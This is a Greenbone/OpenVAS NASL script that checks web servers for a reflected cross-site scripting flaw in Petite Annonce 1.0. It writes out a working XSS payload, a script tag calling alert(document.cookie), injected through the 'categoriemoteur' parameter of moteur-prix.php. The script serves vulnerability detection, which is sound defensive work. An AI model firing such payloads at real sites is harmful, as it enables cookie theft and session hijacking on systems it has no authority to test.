if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803184" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:P/I:N/A:N" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-03-18 13:55:51 +0530 (Mon, 18 Mar 2013)" );
	script_name( "Petite Annonce 'categoriemoteur' Cross Site Scripting Vulnerability" );
	script_xref( name: "URL", value: "http://packetstormsecurity.com/files/120816/" );
	script_xref( name: "URL", value: "http://seclists.org/fulldisclosure/2013/Mar/143" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to execute arbitrary
HTML or web script in a user's browser session in context of an affected site." );
	script_tag( name: "affected", value: "Petite Annonce version 1.0" );
	script_tag( name: "insight", value: "Input passed via the 'categoriemoteur' GET parameter to
'moteur-prix.php' is not properly sanitized before being used." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is installed with Petite Annonce and is prone to cross
site scripting vulnerability." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/annonce", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.html" ), port: port );
	if(ContainsString( rcvRes, "petite annonce" ) && ContainsString( rcvRes, ">DEPOSER UNE ANNONCE<" )){
		url = dir + "/annonce/moteur-prix.php?categoriemoteur=1\"><script>alert" + "(document.cookie);</script>";
		if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "><script>alert\\(document\\.cookie\\);</script>", extra_check: make_list( "regionmoteur.value",
			 "categoriemoteur.value" ) )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

